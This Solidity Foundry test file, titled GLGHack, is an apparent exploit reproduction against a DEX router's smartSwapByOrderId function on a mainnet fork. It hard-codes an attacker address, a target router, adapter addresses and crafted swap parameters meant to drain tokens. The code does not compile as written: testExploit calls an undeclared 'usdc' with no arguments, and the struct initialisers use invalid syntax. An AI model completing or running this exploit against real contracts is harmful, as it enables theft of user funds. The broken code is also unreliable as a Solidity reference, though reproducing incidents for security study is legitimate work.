// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

 struct BaseRequest {
        uint256 fromToken;
        address toToken;
        uint256 fromTokenAmount;
        uint256 minReturnAmount;
        uint256 deadLine;
}

 struct RouterPath {
        address[] mixAdapters;
        address[] assetTo;
        uint256[] rawData;
        bytes[] extraData;
        uint256 fromToken;
    }

library PMMLib {

  // ============ Struct ============
  struct PMMSwapRequest {
      uint256 pathIndex;
      address payer;
      address fromToken;
      address toToken;
      uint256 fromTokenAmountMax;
      uint256 toTokenAmountMax;
      uint256 salt;
      uint256 deadLine;
      bool isPushOrder;
      bytes extension;
      // address marketMaker;
      // uint256 subIndex;
      // bytes signature;
      // uint256 source;  1byte type + 1byte bool（reverse） + 0...0 + 20 bytes address
  }
}    

interface IDexRouter {
    function smartSwapByOrderId(
        uint256 orderId,
        BaseRequest calldata baseRequest,
        uint256[] calldata batchesAmount,
        RouterPath[][] calldata batches,
        PMMLib.PMMSwapRequest[] calldata extraData
    )external payable returns (uint256 returnAmount);   
}
// address 0x4065Db0C9eb7d8F7BbF97763daeA183b771eBd4C;

contract GLGHack is Test {
    IDexRouter hackedRoute = IDexRouter(0x9b9efa5efa731ea9bbb0369e91fa17abf249cfd4);
    address attacker = 0x4065Db0C9eb7d8F7BbF97763daeA183b771eBd4C;

    uint orderId = 0;
    BaseRequest baseRequest = BaseRequest({
        fromToken: 1101429437976570533068894796122584773854841033976, 
         toToken: 0x55d398326f99059fF775485246999027B3197955,
         fromTokenAmount: 5520389000000000000000000,
         minReturnAmount: 228314206940608173731340,
         deadLine: 1753110603
    });

    uint256[] batchesAmount = [5_520_389_000_000_000_000_000_000];
    RouterPath[][]  batches = [[{mixAdapters: [0xA96A96669295e85aF046026bf714A26E84096889], assetTo: [0xA4f3A99F3C57d14133743F90b046068668B81Ff1],
    rawData: [57896044618658097711785507120302035579323955454740286408251985869483865022449],
    extraData: [0x0000000000000000000000000000000000000000000000000000000000000019],
    fromToken: 1101429437976570533068894796122584773854841033976}]],
    extraData = [];

    function setUp() public {       
        vm.createSelectFork("mainnet", 54812113);
    }

    function testExploit() public {
        usdc.smartSwapByOrderId();
    }   
}


// interface IDexRouter {
//     function smartSwapByOrderId(
//          0,
//          {fromToken: 1101429437976570533068894796122584773854841033976, 
//          toToken: 0x55d398326f99059fF775485246999027B3197955,
//          fromTokenAmount: 5520389000000000000000000,
//          minReturnAmount: 228314206940608173731340,
//          deadLine: 1753110603}, 
//          batchesAmount = [5520389000000000000000000], 
//          batches = [[{mixAdapters: [0xA96A96669295e85aF046026bf714A26E84096889],
//          assetTo: [0xA4f3A99F3C57d14133743F90b046068668B81Ff1],
//          rawData: [57896044618658097711785507120302035579323955454740286408251985869483865022449],
//          extraData: [0x0000000000000000000000000000000000000000000000000000000000000019], fromToken: 1101429437976570533068894796122584773854841033976}]],
//          extraData = []
//          ); 
